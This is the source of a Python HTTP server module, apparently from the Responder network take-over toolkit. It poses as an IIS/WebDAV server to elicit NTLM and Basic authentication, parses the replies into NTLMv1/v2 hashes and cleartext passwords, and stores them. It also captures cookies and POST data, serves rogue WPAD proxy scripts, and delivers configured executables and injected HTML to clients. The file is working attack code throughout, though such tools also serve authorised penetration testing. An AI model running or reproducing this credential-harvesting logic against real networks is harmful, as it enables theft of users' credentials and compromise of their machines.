#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
import codecs
from utils import *
from socketserver import BaseRequestHandler, StreamRequestHandler

from base64 import b64decode, b64encode
from packets import NTLM_Challenge
from packets import IIS_Auth_401_Ans, IIS_Auth_Granted, IIS_NTLM_Challenge_Ans, IIS_Basic_401_Ans,WEBDAV_Options_Answer
from packets import WPADScript, ServeExeFile, ServeHtmlFile


# Parse NTLMv1/v2 hash.
def ParseHTTPHash(data, Challenge, client, module):
    LMhashLen    = struct.unpack('<H',data[12:14])[0]
    LMhashOffset = struct.unpack('<H',data[16:18])[0]
    LMHash       = data[LMhashOffset:LMhashOffset+LMhashLen]
    LMHashFinal  = codecs.encode(LMHash, 'hex').upper().decode('latin-1')

    NthashLen    = struct.unpack('<H',data[20:22])[0]
    NthashOffset = struct.unpack('<H',data[24:26])[0]
    NTHash       = data[NthashOffset:NthashOffset+NthashLen]
    NTHashFinal  = codecs.encode(NTHash, 'hex').upper().decode('latin-1')
    UserLen      = struct.unpack('<H',data[36:38])[0]
    UserOffset   = struct.unpack('<H',data[40:42])[0]
    User         = data[UserOffset:UserOffset+UserLen].decode('latin-1').replace('\x00','')
    Challenge1    = codecs.encode(Challenge,'hex').decode('latin-1')
    if NthashLen == 24:
        HostNameLen     = struct.unpack('<H',data[46:48])[0]
        HostNameOffset  = struct.unpack('<H',data[48:50])[0]
        HostName        = data[HostNameOffset:HostNameOffset+HostNameLen].decode('latin-1').replace('\x00','')
        WriteHash = f'{User}::{HostName}:{LMHashFinal}:{NTHashFinal}:{Challenge1}'
        SaveToDb(
            {
                'module': module,
                'type': 'NTLMv1',
                'client': client,
                'host': HostName,
                'user': User,
                'hash': f'{LMHashFinal}:{NTHashFinal}',
                'fullhash': WriteHash,
            }
        )

    if NthashLen > 24:
        NthashLen      = 64
        DomainLen      = struct.unpack('<H',data[28:30])[0]
        DomainOffset   = struct.unpack('<H',data[32:34])[0]
        Domain         = data[DomainOffset:DomainOffset+DomainLen].decode('latin-1').replace('\x00','')
        HostNameLen    = struct.unpack('<H',data[44:46])[0]
        HostNameOffset = struct.unpack('<H',data[48:50])[0]
        HostName       = data[HostNameOffset:HostNameOffset+HostNameLen].decode('latin-1').replace('\x00','')
        WriteHash = f'{User}::{Domain}:{Challenge1}:{NTHashFinal[:32]}:{NTHashFinal[32:]}'
        SaveToDb(
            {
                'module': module,
                'type': 'NTLMv2',
                'client': client,
                'host': HostName,
                'user': Domain + '\\' + User,
                'hash': f'{NTHashFinal[:32]}:{NTHashFinal[32:]}',
                'fullhash': WriteHash,
            }
        )

def GrabCookie(data, host):
    if Cookie := re.search(r'(Cookie:*.\=*)[^\r\n]*', data):
        Cookie = Cookie.group(0).replace('Cookie: ', '')
        if len(Cookie) > 1 and settings.Config.Verbose:
            print(text(f"[HTTP] Cookie           : {Cookie} "))
        return Cookie
    return False

def GrabReferer(data, host):
    if Referer := re.search(r'(Referer:*.\=*)[^\r\n]*', data):
        Referer = Referer.group(0).replace('Referer: ', '')
        if settings.Config.Verbose:
            print(text(f"[HTTP] Referer         : {color(Referer, 3)} "))
        return Referer
    return False

def SpotFirefox(data):
    if UserAgent := re.findall(r'(?<=User-Agent: )[^\r]*', data):
        print(text(f'[HTTP] {color(f"User-Agent        : {UserAgent[0]}", 2)}'))
        if not (IsFirefox := re.search('Firefox', UserAgent[0])):
            return False
        print(color("[WARNING]: Mozilla doesn't switch to fail-over proxies (as it should) when one's failing.", 1))
        print(color("[WARNING]: The current WPAD script will cause disruption on this host. Sending a dummy wpad script (DIRECT connect)", 1))
        return True

def WpadCustom(data, client):
    Wpad = re.search(r'(/wpad.dat|/*\.pac)', data)
    if Wpad and SpotFirefox(data):
        Buffer = WPADScript(Payload="function FindProxyForURL(url, host){return 'DIRECT';}")
        Buffer.calculate()
        return str(Buffer)

    if Wpad and SpotFirefox(data) == False:
        Buffer = WPADScript(Payload=settings.Config.WPAD_Script)
        Buffer.calculate()
        return str(Buffer)
    return False

def IsWebDAV(data):
    return bool(dav := re.search('PROPFIND', data))

def ServeOPTIONS(data):
    if WebDav := re.search('OPTIONS', data):
        Buffer = WEBDAV_Options_Answer()
        return str(Buffer)

    return False

def ServeFile(Filename):
    with open (Filename, "rb") as bk:
        return NetworkRecvBufferPython2or3(bk.read())

def RespondWithFile(client, filename, dlname=None):
    if filename.endswith('.exe'):
        Buffer = ServeExeFile(Payload = ServeFile(filename), ContentDiFile=dlname)
    else:
        Buffer = ServeHtmlFile(Payload = ServeFile(filename))

    Buffer.calculate()
    print(text(f"[HTTP] Sending file {filename} to {client}"))
    return str(Buffer)

def GrabURL(data, host):
    GET = re.findall(r'(?<=GET )[^HTTP]*', data)
    POST = re.findall(r'(?<=POST )[^HTTP]*', data)
    POSTDATA = re.findall(r'(?<=\r\n\r\n)[^*]*', data)

    if GET and settings.Config.Verbose:
        print(text("[HTTP] GET request from: %-15s  URL: %s" % (host, color(''.join(GET), 5))))

    if POST and settings.Config.Verbose:
        print(text("[HTTP] POST request from: %-15s  URL: %s" % (host, color(''.join(POST), 5))))

        if len(''.join(POSTDATA)) > 2:
            print(text(f"[HTTP] POST Data: {''.join(POSTDATA).strip()}"))

# Handle HTTP packet sequence.
def PacketSequence(data, client, Challenge):
    NTLM_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
    Basic_Auth = re.findall(r'(?<=Authorization: Basic )[^\r]*', data)

    # Serve the .exe if needed
    if settings.Config.Serve_Always is True or (settings.Config.Serve_Exe is True and re.findall('.exe', data)):
        return RespondWithFile(client, settings.Config.Exe_Filename, settings.Config.Exe_DlName)

    # Serve the custom HTML if needed
    if settings.Config.Serve_Html:
        return RespondWithFile(client, settings.Config.Html_Filename)

    WPAD_Custom = WpadCustom(data, client)
    if ServeOPTIONS(data):
        return ServeOPTIONS(data)

    if NTLM_Auth:
        Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]
        if Packet_NTLM == b'\x01':
            GrabURL(data, client)
            #GrabReferer(data, client)
            GrabCookie(data, client)

            Buffer = NTLM_Challenge(ServerChallenge=NetworkRecvBufferPython2or3(Challenge))
            Buffer.calculate()

            return IIS_NTLM_Challenge_Ans(
                Payload=b64encode(NetworkSendBufferPython2or3(Buffer)).decode(
                    'latin-1'
                )
            )
        if Packet_NTLM == b'\x03':
            NTLM_Auth = b64decode(''.join(NTLM_Auth))
            module = "WebDAV" if IsWebDAV(data) else "HTTP"
            ParseHTTPHash(NTLM_Auth, Challenge, client, module)

            if settings.Config.Force_WPAD_Auth and WPAD_Custom:
                print(text(f'[HTTP] WPAD (auth) file sent to {client.replace("::ffff:", "")}'))

                return WPAD_Custom
            else:
                Buffer = IIS_Auth_Granted(Payload=settings.Config.HtmlToInject)
                Buffer.calculate()
                return Buffer

    elif Basic_Auth:
        ClearText_Auth = b64decode(''.join(Basic_Auth))

        GrabURL(data, client)
        #GrabReferer(data, client)
        GrabCookie(data, client)

        SaveToDb({
            'module': 'HTTP', 
            'type': 'Basic', 
            'client': client, 
            'user': ClearText_Auth.decode('latin-1').split(':')[0], 
            'cleartext': ClearText_Auth.decode('latin-1').split(':')[1], 
            })

        if settings.Config.Force_WPAD_Auth and WPAD_Custom:
            if settings.Config.Verbose:
                print(text(f'[HTTP] WPAD (auth) file sent to {client.replace("::ffff:", "")}'))

            return WPAD_Custom
        else:
            Buffer = IIS_Auth_Granted(Payload=settings.Config.HtmlToInject)
            Buffer.calculate()
            return Buffer
    else:
        if settings.Config.Basic:
            Response = IIS_Basic_401_Ans()
            if settings.Config.Verbose:
                print(
                    text(
                        f'[HTTP] Sending BASIC authentication request to {client.replace("::ffff:", "")}'
                    )
                )

        else:
            Response = IIS_Auth_401_Ans()
            if settings.Config.Verbose:
                print(
                    text(
                        f'[HTTP] Sending NTLM authentication request to {client.replace("::ffff:", "")}'
                    )
                )

        return Response

# HTTP Server class
class HTTP(BaseRequestHandler):

    def handle(self):
        try:
            Challenge = RandomChallenge()
            while True:
                self.request.settimeout(3)
                remaining = 10*1024*1024 #setting max recieve size
                data = ''
                while True:
                    buff = ''
                    buff = NetworkRecvBufferPython2or3(self.request.recv(8092))
                    if buff == '':
                        break
                    data += buff
                    remaining -= len(buff)
                    #check if we recieved the full header
                    if data.find('\r\n\r\n') != -1: 
                        if data.find('Content-Length') == -1:
                            #request contains only header
                            break
                        #searching for that content-length field in the header
                        for line in data.split('\r\n'):
                            if line.find('Content-Length') != -1:
                                line = line.strip()
                                remaining = int(line.split(':')[1].strip()) - len(data)
                    if remaining <= 0:
                        break
                if data == "":
                    break
                #now the data variable has the full request
                Buffer = WpadCustom(data, self.client_address[0])

                if Buffer and settings.Config.Force_WPAD_Auth == False:
                    self.request.send(NetworkSendBufferPython2or3(Buffer))
                    self.request.close()
                    if settings.Config.Verbose:
                        print(
                            text(
                                f'[HTTP] WPAD (no auth) file sent to {self.client_address[0].replace("::ffff:", "")}'
                            )
                        )

                else:
                    Buffer = PacketSequence(data,self.client_address[0], Challenge)
                    self.request.send(NetworkSendBufferPython2or3(Buffer))

        except Exception:
            pass
            

